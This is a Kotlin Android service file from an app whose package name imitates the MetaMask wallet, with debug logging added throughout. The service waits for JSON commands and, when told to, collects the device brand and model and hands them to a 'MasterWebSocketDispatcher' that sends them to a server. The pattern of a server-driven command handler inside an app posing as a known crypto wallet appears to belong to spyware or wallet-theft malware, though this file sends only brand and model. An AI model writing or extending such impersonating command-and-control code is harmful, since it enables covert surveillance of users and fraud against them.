package com.example.MetaMask.services

import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import org.json.JSONObject

class UUIDService : Service() {

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onBind(intent: Intent?): IBinder? {
        android.util.Log.d("XDBG", "[UUIDService] onBind enter intent=${intent}") //xdbg
        android.util.Log.d("XDBG", "[UUIDService] return") //xdbg
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[UUIDService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val commandJsonString = intent?.getStringExtra("command")

        if (commandJsonString.isNullOrBlank()) {
            android.util.Log.d("XDBG", "[UUIDService] if branch") //xdbg
            stopSelf()
            android.util.Log.d("XDBG", "[UUIDService] return") //xdbg
            return START_NOT_STICKY
        }

        serviceScope.launch {
            try {
                val commandJson = JSONObject(commandJsonString)
                val action = commandJson.optString("action")

                if (action == "getDeviceInfo") {
                    android.util.Log.d("XDBG", "[UUIDService] if branch") //xdbg
                    collectAndSendDeviceData()
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[UUIDService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            } finally {
                stopSelf()
            }
        }

        android.util.Log.d("XDBG", "[UUIDService] return") //xdbg
        return START_NOT_STICKY
    }

    private fun collectAndSendDeviceData() {
        android.util.Log.d("XDBG", "[UUIDService] collectAndSendDeviceData enter") //xdbg
        try {
            val deviceInfo = JSONObject().apply {
                put("brand", Build.BRAND)
                put("model", Build.MODEL)
            }

            val payload = JSONObject().apply {
                put("action", "uploadDeviceInfo")
                put("deviceInfo", deviceInfo)
            }

            sendDataToDispatcher(payload)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[UUIDService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
    }

    private fun sendDataToDispatcher(jsonData: JSONObject) {
        android.util.Log.d("XDBG", "[UUIDService] sendDataToDispatcher enter jsonData=${jsonData}") //xdbg
        val intent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
            putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, jsonData.toString())
            setPackage(packageName)
        }

        sendBroadcast(intent)
    }

    override fun onDestroy() {
        android.util.Log.d("XDBG", "[UUIDService] onDestroy enter") //xdbg
        super.onDestroy()
        serviceJob.cancel()
    }
}
